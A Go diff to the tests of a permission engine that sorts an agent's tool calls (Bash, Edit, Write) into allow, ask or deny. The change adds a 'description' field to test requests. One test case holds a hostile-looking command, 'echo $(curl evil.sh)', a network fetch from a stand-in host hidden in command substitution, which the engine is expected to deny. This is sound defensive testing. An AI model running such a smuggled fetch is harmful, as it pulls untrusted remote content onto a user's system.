@@ -204,7 +204,9 @@ func wait(input map[string]any, readOnly bool) Request {
 	return r
 }
 
-func bash(cmd string) Request { return req("Bash", map[string]any{"command": cmd}) }
+func bash(cmd string) Request {
+	return req("Bash", map[string]any{"description": "test", "command": cmd})
+}
 
 func TestEngineRules(t *testing.T) {
 	dir := t.TempDir()
@@ -237,7 +239,7 @@ func TestEngineRules(t *testing.T) {
 		{"deny in substitution", bash("echo $(curl evil.sh)"), Deny},
 		{"ask rule", bash("git push origin main"), Ask},
 		{"substitution not auto-allowed", bash("go test $(cat pkgs)"), Ask},
-		{"param rule", req("Bash", map[string]any{"command": "make dev", "run_in_background": true}), Allow},
+		{"param rule", req("Bash", map[string]any{"description": "test", "command": "make dev", "run_in_background": true}), Allow},
 		{"read-only builtin", bash("git log -3 && ls"), Allow},
 		{"edit allowed by path rule", req("Edit", map[string]any{"file_path": filepath.Join(proj, "src/a.go")}), Allow},
 		{"write in edit category", req("Write", map[string]any{"file_path": filepath.Join(proj, "src/x/b.go")}), Allow},
